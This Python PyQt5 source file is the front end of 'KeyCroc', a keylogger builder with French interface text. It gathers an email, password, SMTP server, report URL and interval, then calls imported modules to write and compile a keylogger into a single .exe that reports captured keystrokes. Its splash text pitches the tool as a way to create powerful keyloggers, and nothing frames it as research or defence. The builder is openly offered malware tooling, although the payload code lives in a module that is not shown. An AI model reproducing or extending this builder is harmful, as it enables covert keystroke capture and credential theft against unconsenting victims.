import sys
import random
import pyautogui
from modules.write_keylog import Writer
from modules.db_configuration import DbConfiguration
from PyQt5.QtCore import Qt, QRect
from PyQt5 import QtGui, QtCore
from PyQt5.QtGui import QCursor
from PyQt5.QtGui import QPixmap, QPalette, QBrush, QImage
from PyQt5.QtWidgets import QApplication, QGroupBox, QSpinBox, QFormLayout, QLabel, QPushButton, QLineEdit, QTextEdit, QDesktopWidget, QHBoxLayout, QVBoxLayout, QWidget, QFileDialog, QGridLayout, QInputDialog, QFrame, QMenuBar, QMenu, QMessageBox

width, height = pyautogui.size()
widgets = {
    "button": [],
    "frame": [],
    "label": [],
    "input": [],
    "spinbox": [],
    "groupbox": [],
    "menubar": []
}

themes = [0, 1, 2, 3]
theme_choiced = random.choice(themes)

if theme_choiced == 0:
    background = "background/background(2).png"
    couleur = "#69FF94"
elif theme_choiced == 1:
    background = "background/background.png"
    couleur = "#FF8969"
elif theme_choiced == 2:
    background = "background/background(3).png"
    couleur = "#6B69FF"
else:
    background = "background/background(4).png"
    couleur = "#FF6969"


class Window(QWidget):

    def __init__(self):

        super().__init__()
        self.setFixedWidth(900)
        self.setFixedHeight(600)
        self.setWindowTitle('KeyCroc')
        self.move(int(width/4), int(height/4))
        self.setWindowIcon(QtGui.QIcon('background/icon.png'))
        self.setStyleSheet(
            """
            *{
                font-family: Noto Sans;
            }
            """
        )

        self.palette = QPalette()
        self.palette.setBrush(QPalette.Background, QBrush(QImage(background)))
        self.setPalette(self.palette)

        self.grid = QHBoxLayout()

        self.load_frame1()
        self.setLayout(self.grid)
        self.show()

    def load_frame1(self):

        self.frame1(couleur=couleur)

    def load_frame2(self):

        self.clear_widget()
        self.frame2(couleur=couleur)

    def clear_widget(self):

        for widget in widgets:
            if widgets[widget] != []:
                widgets[widget][-1].hide()
            for i in range(0, len(widgets[widget])):
                widgets[widget].pop()

    def ouvrir_dialog(self):

        QMessageBox.information(self, "Informations", f"<h3 style='color: {couleur};'>Le programme va compiler le keylogger en un seul fichier <strong>.exe</strong></h3>")

    def get_info(self):

        self.ouvrir_dialog()

        self.email = self.champs_email.text()
        self.password = self.champs_password.text()
        self.interval = self.champs_interval.text()
        self.url = self.champs_url.text()
        self.smtp_addr = self.champs_smtp_addr.text()
        self.nom = self.champs_name.text()

        self.writer = Writer(
            smtp_addr=self.smtp_addr,
            interval=self.interval,
            email=self.email,
            password=self.password,
            url=self.url,
            name=self.nom
        )
        self.writer.write_keylogger()
        self.writer.compile_keylog()

        self.config = DbConfiguration()

        self.config.insert_data(
            smtp=self.smtp_addr,
            email=self.email,
            password=self.password,
            url=self.url,
            interval=self.interval,
            name=self.nom
        )

    def create_form(self, couleur):

        self.layout = QFormLayout(self)

        self.label_email = QLabel("E-mail")
        self.label_email.setStyleSheet(
            """
            *{
                color: """ + str(couleur)+";" +
                """font-size: 16px;
                background: rgba(0, 0, 0, 0.0);
            }
            """
        )

        self.label_passwd = QLabel("Mot de passe")
        self.label_passwd.setStyleSheet(
            """
            *{
                color: """ + str(couleur)+";" +
                """font-size: 16px;
                background: rgba(0, 0, 0, 0.0);
            }
            """
        )

        self.label_smtp = QLabel("Adresse du serveur SMTP")
        self.label_smtp.setStyleSheet(
            """
            *{
                color: """ + str(couleur)+";" +
                """font-size: 16px;
                background: rgba(0, 0, 0, 0.0);
            }
            """
        )

        self.label_url = QLabel("Url de la page web report")
        self.label_url.setStyleSheet(
            """
            *{
                color: """ + str(couleur)+";" +
                """font-size: 16px;
                background: rgba(0, 0, 0, 0.0);
            }
            """
        )

        self.label_report = QLabel("Interval de report")
        self.label_report.setStyleSheet(
            """
            *{
                color: """ + str(couleur)+";" +
                """font-size: 16px;
                background: rgba(0, 0, 0, 0.0);
            }
            """
        )

        self.label_name = QLabel("Nom de votre programme")
        self.label_name.setStyleSheet(
            """
            *{
                color: """ + str(couleur) + ";" +
            """font-size: 16px;
            background: rgba(0, 0, 0, 0.0);
        }
        """
        )

        self.button_validation = QPushButton("Valider")
        self.button_validation.setFixedWidth(800)
        self.button_validation.setFixedHeight(55)
        self.button_validation.setStyleSheet(
            """
            *{
                border: 4px solid""" + str(couleur) + """;
                border-radius: 22px;
                background: rgba(0, 0, 0, 0.0);
                padding: 15px 15px 15px 15px;
                font-size: 19px;
            }

            *:hover{
                background: """ + str(couleur) + """;
                color: white;
            }
            """
        )
        self.button_validation.clicked.connect(self.get_info)

        self.layout.addRow(self.label_email, self.champs_email)
        self.layout.addRow(self.label_passwd, self.champs_password)
        self.layout.addRow(self.label_smtp, self.champs_smtp_addr)
        self.layout.addRow(self.label_url, self.champs_url)
        self.layout.addRow(self.label_report, self.champs_interval)
        self.layout.addRow(self.label_name, self.champs_name)
        self.layout.addRow(self.button_validation, None)

        self.groupbox.setLayout(self.layout)

    def frame1(self, couleur):

        self.label = QLabel(
            """\nLes keyloggers n\'ont \njamais été aussi puissants.\nQu\'attendez-vous \npour créer le votre ?
            """
        )
        self.label.setObjectName('label')
        self.label.setFixedWidth(400)
        self.label.setFixedHeight(250)
        self.label.setStyleSheet(
            """
            *{
                color: white;
                font-size: 24px;
                background: rgba(30, 30, 30, 0.8);
                border: none;
                border-radius: 25px;
                padding: 15px 12px;
                margin: 12px 12px 12px 12px;
            }
            """
        )
        widgets["label"].append(self.label)

        self.button = QPushButton("Commencer")
        self.button.setFixedWidth(200)
        self.button.setFixedHeight(50)
        self.button.setStyleSheet(
            """*{
                border: 4px solid """ + str(couleur) +";" +
            """ 
                border-radius: 25px;
                color: white;
                font-size: 24px;
                margin-right: 25px;
            }
            *:hover{
                background: """ + str(couleur) +";" +
            """
                color: black;
            }
            """
        )
        widgets["button"].append(self.button)
        self.button.clicked.connect(self.load_frame2)

        self.grid.addWidget(self.label)
        self.grid.addWidget(self.button)

    def frame2(self, couleur):

        self.menubar = QMenuBar(self)
        self.menubar.setStyleSheet(
            """"""
        )

        self.groupbox = QGroupBox("Création")
        self.groupbox.setStyleSheet(
            """
            *{
                border: none;
                color: """ + str(couleur) + """;
                border-radius: 26px;
                margin: 40px 35px 40px 35px;
                background: rgba(0, 0, 0, 0.8);
            }
            """
        )

        self.champs_email = QLineEdit(self)
        self.champs_email.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )
        self.champs_password = QLineEdit(self)
        self.champs_password.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )
        self.champs_smtp_addr = QLineEdit(self)
        self.champs_smtp_addr.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )
        self.champs_url = QLineEdit(self)
        self.champs_url.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )
        self.champs_interval = QSpinBox(self)
        self.champs_interval.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )

        self.champs_name = QLineEdit(self)
        self.champs_name.setStyleSheet(
            """
            *{
                border: none;
                border-radius: 20px;
                margin: 12px 12px 12px 12px;
                padding: 12px 20px 12px 20px;
                background: #2A2A2A;
                font-size: 16px;
            } 
            """
        )

        widgets["input"].append(self.champs_email)
        widgets["input"].append(self.champs_password)
        widgets["input"].append(self.champs_interval)
        widgets["input"].append(self.champs_smtp_addr)
        widgets["input"].append(self.champs_url)
        widgets["input"].append(self.champs_name)
        widgets["menubar"].append(self.menubar)
        widgets["groupbox"].append(self.groupbox)

        self.create_form(couleur=couleur)
        self.grid.addWidget(self.groupbox)
        self.grid.addWidget(self.menubar)

if __name__ == "__main__":

    app = QApplication(sys.argv)
    window = Window()
    sys.exit(app.exec())